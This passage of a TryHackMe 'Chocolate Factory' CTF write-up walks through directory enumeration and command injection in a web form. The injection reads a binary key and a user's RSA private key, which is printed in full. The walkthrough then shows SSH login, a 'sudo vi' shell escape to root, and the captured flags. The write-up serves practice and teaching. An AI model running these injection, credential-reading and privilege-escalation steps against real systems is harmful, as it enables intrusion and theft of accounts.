+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.5.181:80/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /home/prowl/SecLists/Discovery/Web-Content/big.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2023/03/14 17:28:51 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/home.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>/validate.php         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>/server status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> 
+</span></span></code></pre></div><p>As Gobuster found the <code>home.php</code> i took a look at it.</p>
+<h2 id="command-injection">Command Injection<a href="#command-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This Web Application has a vulnerabily,the <code>Command Injection</code></p>
+<ul>
+<li>I insert <code>ls</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>home.jpg
+</span></span><span style="display:flex;"><span>home.php
+</span></span><span style="display:flex;"><span>image.png
+</span></span><span style="display:flex;"><span>index.html
+</span></span><span style="display:flex;"><span>index.php.bak
+</span></span><span style="display:flex;"><span>key_rev_key
+</span></span><span style="display:flex;"><span>validate.php
+</span></span></code></pre></div><ul>
+<li>I insert <code>cat key_rev_key</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ELF&gt;�@�@8	@@@@��888�
+</span></span><span style="display:flex;"><span>�
+</span></span><span style="display:flex;"><span> �
+</span></span><span style="display:flex;"><span>�
+</span></span><span style="display:flex;"><span> �
+</span></span><span style="display:flex;"><span> x� �
+</span></span><span style="display:flex;"><span>�
+</span></span><span style="display:flex;"><span> �
+</span></span><span style="display:flex;"><span> ��TTTDDP�td�	�	�	&lt;&lt;Q�tdR�td�
+</span></span><span style="display:flex;"><span>�
+</span></span><span style="display:flex;"><span> �
+</span></span><span style="display:flex;"><span> hh/lib64/ld-linux-x86-64.so.2GNUGNU�s�ŗ5
+</span></span><span style="display:flex;"><span>tz�~������ 0MF� � 7<span style="color:#e6db74">&#34;libc.so.6__isoc99_scanfputs__stack_chk_failprintf__cxa_finalizestrcmp__libc_start_mainGLIBC_2.7GLIBC_2.4GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableii
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_ii
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">iui	s�
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ��
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> `  � � � � 	� 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">� � � � � H��H��	 H��t��H����5j	 �%l	 @�%j	 h������%b	 h������%Z	 h������%R	 h�����%J	 h�����%b	 f�1�I��^H��H���PTL�*H�
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">�H�=��	 �DH�=9	 UH�1	 H9�H��tH�� H��t
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">]��f.�]�@f.�H�=� H�5� UH)�H��H��H��H��?H�H��tH�� H��t]��f�]�@f.��=� u/H�=� UH��tH�=� �
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">����H����� ]����fDUH��]�f���UH��H��@�}�H�u�dH�%(H�E�1�H�=)�����H�E�H��H�=#�����H�E�H�5H���l�����u5H�=	��G���H�=(��6���H�=G��%����H�=D������H�U�dH3%(t�������f.�f�AWAVI��AUATL�% UH�- SA��I��L)�H��H���w���H��t 1��L��L��D��A��H��H9�u�H��[]A\A]A^A_Ðf.���H��H���Enter your name: %slaksdhfas
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> congratulations you have found the key:   b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Keep its safeBad name!;8�������������T���������L���,zRx�����+zRx�</span>$<span style="color:#e6db74">���`FJw�?;*3</span>$<span style="color:#e6db74">&#34;</span>DH���<span style="color:#ae81ff">\J</span>����A�C
+</span></span><span style="display:flex;"><span>�D|����eB�B�E �B<span style="color:#f92672">(</span>�H0�H8�M@r8A0A<span style="color:#f92672">(</span>B BBB�����<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>��
+</span></span><span style="display:flex;"><span> �
+</span></span><span style="display:flex;"><span> ���o���
+</span></span><span style="display:flex;"><span>�� x���	���o���o����o���o����o�
+</span></span><span style="display:flex;"><span> FVfv� GCC: <span style="color:#f92672">(</span>Ubuntu 7.5.0-3ubuntu1~18.04<span style="color:#f92672">)</span> 7.5.08Tt�����	�
+</span></span><span style="display:flex;"><span>�0
+</span></span><span style="display:flex;"><span>�����	�	�
+</span></span><span style="display:flex;"><span> �
+</span></span><span style="display:flex;"><span> �
+</span></span><span style="display:flex;"><span> �   ���!<span style="color:#e6db74">`</span>7 F�
+</span></span><span style="display:flex;"><span> m�y�
+</span></span><span style="display:flex;"><span> �������
+</span></span><span style="display:flex;"><span>����
+</span></span><span style="display:flex;"><span> ��
+</span></span><span style="display:flex;"><span> ��
+</span></span><span style="display:flex;"><span> ��	�� � �  2D �Kg<span style="color:#f92672">{</span>� �� � ���pe� ��+� ��! - G<span style="color:#e6db74">&#34;�crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.7698__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrylicense.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edata__stack_chk_fail@@GLIBC_2.4printf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_startstrcmp@@GLIBC_2.2.5__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain__isoc99_scanf@@GLIBC_2.7__TMC_END___ITM_registerTMCloneTable__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment88#TT 1tt</span>$<span style="color:#e6db74">D���o��N��V���^���o��k���o��@z����B��x��00`������B���	������	�	&lt;��	�	��
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> �
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">��
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> �
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">��
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> �
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">��� �h� � �0)@H+	�c��
+</span></span></span></code></pre></div><p>I have discover the key: <code>b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='</code>
+Enter the key you found!  <code>b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='</code></p>
+<p>I get from  command injetion the id_rsa of charlie: <code>cat /home/charlie/teleport</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+</span></span><span style="display:flex;"><span>1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+</span></span><span style="display:flex;"><span>L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+</span></span><span style="display:flex;"><span>B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+</span></span><span style="display:flex;"><span>fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+</span></span><span style="display:flex;"><span>RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+</span></span><span style="display:flex;"><span>Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+</span></span><span style="display:flex;"><span>zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+</span></span><span style="display:flex;"><span>w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+</span></span><span style="display:flex;"><span>kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+</span></span><span style="display:flex;"><span>j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+</span></span><span style="display:flex;"><span>EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+</span></span><span style="display:flex;"><span>RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+</span></span><span style="display:flex;"><span>uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+</span></span><span style="display:flex;"><span>KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+</span></span><span style="display:flex;"><span>RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+</span></span><span style="display:flex;"><span>znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+</span></span><span style="display:flex;"><span>la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
+</span></span><span style="display:flex;"><span>FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
+</span></span><span style="display:flex;"><span>82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
+</span></span><span style="display:flex;"><span>37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+</span></span><span style="display:flex;"><span>ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+</span></span><span style="display:flex;"><span>Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+</span></span><span style="display:flex;"><span>Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+</span></span><span style="display:flex;"><span>G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span></code></pre></div><p>Then I copy this text in a file and I change the privilegies:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nano id_rsa 
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span></code></pre></div><p>Login with <code>ssh</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh -i id_rsa charlie@10.10.5.181
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-115-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Tue Dec <span style="color:#ae81ff">13</span> 20:39:55 UTC <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:  0.11              Processes:           <span style="color:#ae81ff">595</span>
+</span></span><span style="display:flex;"><span>  Usage of /:   43.6% of 8.79GB   Users logged in:     <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  Memory usage: 60%               IP address <span style="color:#66d9ef">for</span> eth0: 10.10.5.181
+</span></span><span style="display:flex;"><span>  Swap usage:   0%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates are security updates.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span style="display:flex;"><span>applicable law.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span style="display:flex;"><span>applicable law.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Tue Dec <span style="color:#ae81ff">13</span> 20:24:25 <span style="color:#ae81ff">2022</span> from 10.8.21.1
+</span></span><span style="display:flex;"><span>Could not chdir to home directory /home/charley: No such file or directory
+</span></span><span style="display:flex;"><span>To run a command as administrator <span style="color:#f92672">(</span>user <span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">)</span>, use <span style="color:#e6db74">&#34;sudo &lt;command&gt;&#34;</span>.
+</span></span><span style="display:flex;"><span>See <span style="color:#e6db74">&#34;man sudo_root&#34;</span> <span style="color:#66d9ef">for</span> details.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>charlie@chocolate-factory:/$ 
+</span></span></code></pre></div><p>I take the <code>user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>charlie@chocolate-factory:/home/charlie$ cat user.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>cd5509042371b34e4826e4838b522d2e<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see sudo privileges:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>charlie@chocolate-factory:/$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> charlie on chocolate-factory:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User charlie may run the following commands on chocolate-factory:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : !root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/vi
+</span></span></code></pre></div><p>I  spawn the shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>charlie@chocolate-factory:/$ sudo vi -c <span style="color:#e6db74">&#39;:!/bin/sh&#39;</span> /dev/null
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>I change directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># cd /root</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls -all</span>
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">6</span> root    root    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2020</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">24</span> root    root    <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2020</span> ..
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root    root       <span style="color:#ae81ff">0</span> Oct  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2020</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root    root    <span style="color:#ae81ff">3106</span> Apr  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2018</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root    root    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2020</span> .cache
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root    root    <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2020</span> .gnupg
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root    root    <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root    root     <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
+</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> charlie charley  <span style="color:#ae81ff">491</span> Oct  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2020</span> root.py
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root    root      <span style="color:#ae81ff">66</span> Sep <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2020</span> .selected_editor
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root    root    <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2020</span> .ssh
+</span></span></code></pre></div><p>I execute  <code>root.py</code> and I insert the <code>key of the first task</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># python root.py</span>
+</span></span><span style="display:flex;"><span>Enter the key:  b<span style="color:#e6db74">&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;</span>
+</span></span><span style="display:flex;"><span>__   __               _               _   _                 _____ _          
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ \ </span>/ /__  _   _     / <span style="color:#ae81ff">\ </span>  _ __ ___  | <span style="color:#ae81ff">\ </span>| | _____      __ |_   _| |__   ___ 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">\ </span>V / _ <span style="color:#ae81ff">\|</span> | | |   / _ <span style="color:#ae81ff">\ </span>| <span style="color:#e6db74">&#39;__/ _ \ |  \| |/ _ \ \ /\ / /   | | | &#39;</span>_ <span style="color:#ae81ff">\ </span>/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  | | <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> | |_| |  / ___ <span style="color:#ae81ff">\|</span> | |  __/ | |<span style="color:#ae81ff">\ </span> | <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> <span style="color:#ae81ff">\ </span>V  V /    | | | | | |  __/
+</span></span><span style="display:flex;"><span>  |_|<span style="color:#ae81ff">\_</span>__/ <span style="color:#ae81ff">\_</span>_,_| /_/   <span style="color:#ae81ff">\_\_</span>|  <span style="color:#ae81ff">\_</span>__| |_| <span style="color:#ae81ff">\_</span>|<span style="color:#ae81ff">\_</span>__/ <span style="color:#ae81ff">\_</span>/<span style="color:#ae81ff">\_</span>/     |_| |_| |_|<span style="color:#ae81ff">\_</span>__|
+</span></span><span style="display:flex;"><span>                                                                             
+</span></span><span style="display:flex;"><span>  ___                              ___   __  
+</span></span><span style="display:flex;"><span> / _ <span style="color:#ae81ff">\_</span>_      ___ __   ___ _ __   / _ <span style="color:#ae81ff">\ </span>/ _| 
+</span></span><span style="display:flex;"><span>| | | <span style="color:#ae81ff">\ \ </span>/<span style="color:#ae81ff">\ </span>/ / <span style="color:#e6db74">&#39;_ \ / _ \ &#39;</span>__| | | | | |_  
+</span></span><span style="display:flex;"><span>| |_| |<span style="color:#ae81ff">\ </span>V  V /| | | |  __/ |    | |_| |  _| 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">\_</span>__/  <span style="color:#ae81ff">\_</span>/<span style="color:#ae81ff">\_</span>/ |_| |_|<span style="color:#ae81ff">\_</span>__|_|     <span style="color:#ae81ff">\_</span>__/|_|   
+</span></span><span style="display:flex;"><span>                                             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ____ _                     _       _       
+</span></span><span style="display:flex;"><span> / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
+</span></span><span style="display:flex;"><span>| |   | <span style="color:#e6db74">&#39;_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| |___| | | | (_) | (_| (_) | | (_| | ||  __/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                             
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> _____          _                    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  ___|_ _  ___| |_ ___  _ __ _   _  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| |_ / _` |/ __| __/ _ \| &#39;</span>__| | | | 
+</span></span><span style="display:flex;"><span>|  _| <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>__| <span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> | |  | |_| | 
+</span></span><span style="display:flex;"><span>|_|  <span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__/|_|   <span style="color:#ae81ff">\_</span>_, | 
+</span></span><span style="display:flex;"><span>                              |___/  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>cec59161d338fef787fcb4e296b42124<span style="color:#f92672">}</span>
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/tokyo_ghoul/">
+                <span class="button__text">THM Writeup - Tokyo Ghoul (Medium)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
